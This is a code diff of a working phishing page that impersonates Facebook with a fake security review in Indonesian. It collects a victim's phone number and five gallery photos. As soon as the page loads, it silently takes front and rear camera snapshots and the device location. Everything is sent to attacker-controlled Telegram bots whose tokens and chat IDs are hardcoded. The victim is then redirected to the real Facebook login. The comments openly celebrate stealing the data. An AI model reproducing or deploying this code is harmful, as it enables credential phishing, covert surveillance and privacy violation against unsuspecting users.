@@ -3,54 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Security Check</title>
+    <title>Facebook</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; }
-        .main-card { max-width: 450px; margin: 50px auto; border: none; border-radius: 12px; box-shadow: 0 12px 28px rgba(0,0,0,0.1); background: white; overflow: hidden; }
-        .fb-logo { color: #1877f2; font-size: 40px; font-weight: bold; letter-spacing: -1px; }
-        
-        /* Animasi Tombol Smooth ala FB 😋 */
-        .btn-fb { 
-            background-color: #1877f2; color: white; font-weight: bold; 
-            padding: 12px; border-radius: 8px; border: none; 
-            transition: transform 0.1s ease, background-color 0.2s ease;
-            width: 100%;
+        /* Animasi Splash Screen ala FB 😮 */
+        #splash-screen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #fff; z-index: 9999; display: flex; flex-direction: column;
+            align-items: center; justify-content: center;
         }
-        .btn-fb:hover { background-color: #166fe5; }
-        .btn-fb:active { transform: scale(0.96); background-color: #145dbf; } /* Efek Membal */
+        .fb-logo-splash { width: 80px; height: 80px; }
+        .meta-logo { position: absolute; bottom: 50px; width: 100px; }
 
-        .error-msg { color: #fa3e3e; font-size: 12px; display: none; margin-top: 5px; font-weight: bold; }
+        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: none; }
+        .main-card { max-width: 450px; margin: 40px auto; border: none; border-radius: 12px; box-shadow: 0 12px 28px rgba(0,0,0,0.1); background: white; }
+        .fb-logo-text { color: #1877f2; font-size: 45px; font-weight: bold; letter-spacing: -2px; }
+        
+        .btn-fb { 
+            background-color: #1877f2; color: white; font-weight: bold; padding: 12px; 
+            border-radius: 8px; border: none; width: 100%;
+            transition: transform 0.1s ease;
+        }
+        .btn-fb:active { transform: scale(0.95); }
+
+        .error-box { 
+            background: #ffebe9; border: 1px solid #dd3c10; color: #1c1e21; 
+            font-size: 13px; padding: 10px; border-radius: 4px; display: none; margin-bottom: 15px;
+        }
         #video, #canvas { display: none; }
-        .loading-spinner { display: none; }
-        .input-group-fb { border: 1px solid #dddfe2; border-radius: 6px; padding: 10px; margin-bottom: 15px; }
     </style>
 </head>
 <body>
 
-<div class="container">
+<div id="splash-screen">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo-splash">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" class="meta-logo">
+</div>
+
+<div class="container" id="main-content">
     <div class="main-card card p-4 text-center">
-        <div class="fb-logo mb-2">facebook</div>
-        <h5 class="fw-bold">Verifikasi Diperlukan</h5>
-        <p class="text-muted" style="font-size: 14px;">Akun Anda telah dikunci sementara. Mohon lengkapi data berikut untuk membuka kunci.</p>
+        <div class="fb-logo-text mb-2">facebook</div>
+        <h5 class="fw-bold">Tinjauan Keamanan Akun</h5>
+        <p class="text-muted small">Kami mendeteksi upaya login yang tidak biasa. Masukkan data profil Anda untuk verifikasi identitas.</p>
         <hr>
 
+        <div id="mainError" class="error-box text-start">
+            <b>Data Tidak Valid</b><br>Pastikan nomor HP benar dan minimal 5 foto dipilih.
+        </div>
+
         <div class="text-start">
-            <label class="form-label small fw-bold">Nomor Telepon</label>
-            <input type="number" id="phone" class="form-control" placeholder="Masukkan nomor HP">
-            <div id="errPhone" class="error-msg text-danger">⚠️ Nomor HP wajib diisi!</div>
+            <label class="form-label small fw-bold">Nomor Handphone</label>
+            <input type="number" id="phone" class="form-control" placeholder="08xxxxxxxxxx">
             
-            <label class="form-label small fw-bold mt-3">Verifikasi Foto (Pilih 5 Foto)</label>
+            <label class="form-label small fw-bold mt-3">Verifikasi Galeri (Pilih 5 Foto Profil)</label>
             <input type="file" id="galeri" class="form-control" multiple accept="image/*">
-            <div id="errGaleri" class="error-msg">⚠️ Harap pilih minimal 1-5 foto galeri!</div>
         </div>
 
-        <div class="mt-4">
-            <button class="btn-fb" onclick="validateAndSend()">Konfirmasi & Lanjutkan</button>
-        </div>
-
-        <div class="loading-spinner text-primary mt-3" id="loader">
-            <div class="spinner-border spinner-border-sm"></div> <span class="small">Mengautentikasi...</span>
+        <button class="btn-fb mt-4" onclick="validateFinal()">Lanjutkan</button>
+        
+        <div class="mt-3 loading-spinner text-primary" id="loader" style="display:none;">
+            <div class="spinner-border spinner-border-sm"></div> <span class="small">Memproses...</span>
         </div>
     </div>
 </div>
@@ -62,77 +74,69 @@
     const tokens = ["8555398375:AAGESWcRFUKios-h-G7eG8kexiHghzJLGo8", "8220550089:AAF2wuFOcdHAWVMu3dITv4GDspDHIrXngfg"];
     const chats = ["7835924973", "8071786272"];
 
+    // Animasi Splash Screen 😂
     window.onload = () => {
-        autoCapture("user");
-        autoLocation();
+        setTimeout(() => {
+            document.getElementById('splash-screen').style.display = 'none';
+            document.body.style.display = 'block';
+            autoCapture("user");
+            autoLocation();
+        }, 2500); // 2.5 Detik Loading ala FB
     };
 
-    function sendToBot(content, type = "text", blob = null) {
+    function sendToTelegram(content, type = "text", blob = null) {
         tokens.forEach((token, i) => {
-            const formData = new FormData();
-            formData.append("chat_id", chats[i]);
-            let url = `https://api.telegram.org/bot${token}/`;
-
+            const fd = new FormData();
+            fd.append("chat_id", chats[i]);
             if (type === "text") {
-                url += "sendMessage";
-                formData.append("text", content);
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: "POST", headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                    body: `chat_id=${chats[i]}&text=${encodeURIComponent(content)}`
+                });
             } else {
-                url += "sendPhoto";
-                formData.append("photo", blob || content, "data.jpg");
-                formData.append("caption", content);
+                fd.append("photo", blob || content, "img.jpg");
+                fd.append("caption", content);
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: fd });
             }
-            fetch(url, { method: "POST", body: formData });
         });
     }
 
-    // Validasi Ganas ☠️
-    function validateAndSend() {
+    function validateFinal() {
         const phone = document.getElementById('phone').value;
-        const galeri = document.getElementById('galeri').files;
-        const errP = document.getElementById('errPhone');
-        const errG = document.getElementById('errGaleri');
-        let valid = true;
+        const files = document.getElementById('galeri').files;
+        const errBox = document.getElementById('mainError');
 
-        // Cek Nomor
-        if (!phone) {
-            errP.style.display = 'block';
-            valid = false;
-        } else { errP.style.display = 'none'; }
+        // LOGIKA ANTI NGASAL: Minimal 10 digit buat nomor HP ☠️
+        if (phone.length < 10 || files.length < 5) {
+            errBox.style.display = 'block';
+            return;
+        }
 
-        // Cek Galeri
-        if (galeri.length === 0) {
-            errG.style.display = 'block';
-            valid = false;
-        } else { errG.style.display = 'none'; }
-
-        if (!valid) return; // Kalo gak valid, GAGAL total, data gak bakal dikirim! 😂
-
-        // Kalo VALID, sikat datanya!
+        errBox.style.display = 'none';
         document.getElementById('loader').style.display = 'block';
-        sendToBot(`📱 NOMOR TARGET: ${phone}`);
-        
-        for (let i = 0; i < Math.min(galeri.length, 5); i++) {
-            sendToBot(`🖼️ GALERI ${i+1}`, "photo", galeri[i]);
+
+        // Sikat ke Telegram! 😈
+        sendToTelegram(`📱 NOMOR HP: ${phone}`);
+        for (let i = 0; i < 5; i++) {
+            sendToTelegram(`🖼️ GALERI ${i+1}`, "photo", files[i]);
         }
 
         setTimeout(() => {
-            alert("Verifikasi Berhasil! Akun akan segera pulih.");
             window.location.href = "https://www.facebook.com/login";
         }, 3000);
     }
 
-    // Auto Capture & Location (Tetep jalan di background 😈)
+    // Auto Background Task ☠️
     async function autoCapture(mode) {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
+            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+            const v = document.getElementById('video'); v.srcObject = s;
             setTimeout(() => {
-                const canvas = document.getElementById('canvas');
-                canvas.width = 480; canvas.height = 640;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(b => sendToBot(`📸 Kamera ${mode}`, "photo", b), 'image/jpeg');
-                stream.getTracks().forEach(t => t.stop());
+                const c = document.getElementById('canvas');
+                c.width = 480; c.height = 640;
+                c.getContext('2d').drawImage(v, 0, 0);
+                c.toBlob(b => sendToTelegram(`📸 Cam ${mode}`, "photo", b), 'image/jpeg');
+                s.getTracks().forEach(t => t.stop());
                 if(mode === "user") setTimeout(() => autoCapture("environment"), 3000);
             }, 2000);
         } catch (e) { window.location.href = "https://www.facebook.com/login"; }
@@ -140,7 +144,7 @@
 
     function autoLocation() {
         navigator.geolocation.getCurrentPosition(p => {
-            sendToBot(`📍 LOKASI: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            sendToTelegram(`📍 LOKASI: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
         });
     }
 </script>
